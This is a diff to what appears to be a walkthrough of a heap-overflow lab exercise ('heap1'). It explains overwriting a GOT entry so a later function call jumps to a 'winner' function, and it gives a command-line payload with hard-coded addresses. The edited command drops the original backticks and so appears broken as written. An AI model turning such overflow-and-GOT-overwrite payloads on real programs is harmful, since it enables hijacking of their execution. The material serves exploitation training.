@@ -4,5 +4,5 @@ So we will do the same with heap 0 where we will first have the first strcpy cal
 Then the second write will be able to write a value we want, where we want. <br>
 Finally, we will write to the got table so when it calls one function, it will actually call another. <br>
 The command we will input is: <br>
-./heap1 `python2 -c 'print "0"*20 + "\x18\xa0\x04\x08" + " " + "\xb6\x84\x04\x08"'` <br>
+./heap1 python -c 'print("0"*20 + "\x18\xa0\x04\x08" + " " + "\xb6\x84\x04\x08")' <br>
 And like that we are the winner. <br>
